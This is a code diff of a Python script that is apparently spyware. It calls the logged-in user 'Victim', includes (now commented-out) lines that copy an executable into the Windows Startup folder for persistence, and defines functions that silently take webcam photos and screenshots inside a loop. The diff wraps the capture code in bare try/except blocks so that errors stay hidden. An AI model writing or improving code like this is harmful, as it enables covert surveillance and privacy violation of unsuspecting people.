@@ -1,9 +1,9 @@
 import os,time,shutil
 
 
-startup = ('C:/Users/' + str(os.getlogin()).strip() + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
+#startup = ('C:/Users/' + str(os.getlogin()).strip() + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
 #shutil.copy2('run.exe',startup)
-os.path.basename(__file__)
+#os.path.basename(__file__)
 
 
 try:
@@ -22,15 +22,21 @@ Victim = os.getlogin()
 
 
 def camera_click():
-    camera = cv2.VideoCapture(0)
-    for i in range(1):
-      return_value, image = camera.read()
-      cv2.imwrite('pic.png', image)
-    del(camera)
+    try:
+        camera = cv2.VideoCapture(0)
+        for i in range(1):
+            return_value, image = camera.read()
+            cv2.imwrite('pic.png', image)
+        del(camera)
+    except:
+        pass
 
 def screenshoot_click():
-    myScreenshot = pyautogui.screenshot()
-    myScreenshot.save('pic2.png')
+    try:
+        myScreenshot = pyautogui.screenshot()
+        myScreenshot.save('pic2.png')
+    except:
+        pass
 
 
 while True:
